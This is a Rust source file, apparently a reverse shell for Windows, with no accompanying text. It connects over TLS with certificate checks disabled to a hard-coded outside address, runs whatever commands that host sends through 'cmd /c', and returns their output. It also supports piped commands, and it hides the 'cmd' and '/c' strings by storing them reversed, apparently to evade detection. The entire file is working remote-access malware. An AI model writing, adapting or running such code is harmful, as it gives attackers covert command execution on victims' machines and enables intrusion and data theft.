use std::io::{Read, Write};
use std::net;
use std::net::{Ipv4Addr, TcpStream, SocketAddr};
use std::process::{Command, Stdio};
use std::str;
use std::thread;
use std::path::Path;
use openssl::ssl::{SslMethod, SslConnector};
use std::ffi::OsStr;

fn main() {
    let mut build = SslConnector::builder(SslMethod::tls()).unwrap();
    build.set_verify(openssl::ssl::SslVerifyMode::NONE);
    let connector = build.build();
	let addr = Ipv4Addr::from(0xcafebabe);
	let sockettest = SocketAddr::from((addr,0xceec));
	let convertsocket = sockettest.to_string();
	let convertip = addr.to_string();
    let stream = TcpStream::connect(&convertsocket).unwrap();
    let mut stream = connector.connect(&convertip,stream).unwrap();
    loop {
        let mut recv = [0 as u8; 1024];
        stream.read(&mut recv);
        let my_string = String::from_utf8_lossy(&recv);
        let mut split = my_string.split("\n");
        let osstr = "dmc";
        let osstr2 = osstr.chars().rev().collect::<String>();
        let osstr3 = "c/";
        let osstr4 = osstr3.chars().rev().collect::<String>();
        let main_command = split.next().unwrap();
        let string2: Vec<&str> = main_command.split(" ").collect();
        let string5: Vec<String> = main_command.split(" ").map(|s| s.to_string()).collect();
        if let Ok(command) = Command::new(osstr2.clone()).arg(osstr4.clone()).args(&string2[0..]).output() {
            if command.stdout.len() != 0 {
                stream.write_all(&command.stdout).unwrap();
            }else {
                stream.write_all(&command.stderr).unwrap();
            };
        } else if main_command.contains("|") {
            let string3: Vec<&str> = main_command.split("|").collect();
            let string4: Vec<&str> = string3[0].split(" ").collect();
            let string5: Vec<&str> = string3[1].split(" ").collect();
            if let Ok(fp1) = Command::new(osstr2.clone())
                .arg(osstr4.clone())
                .arg(&string4[0])
                .args(&string4[1..])
                .stdout(Stdio::piped())
                .spawn()
            {
                if let Ok(fp2) = Command::new(osstr2)
                    .arg(osstr4.clone())
                    .arg(string5[0])
                    .args(&string5[1..])
                    .stdin(fp1.stdout.expect("Command failed"))
                    .output()
                {
                    stream.write_all(&fp2.stdout);
                } else {
                    stream.write_all(b"Error");
                }
            } else {
                stream.write_all(b"");
            }
        } else {
            stream.write_all(b"");
        }
    }
}


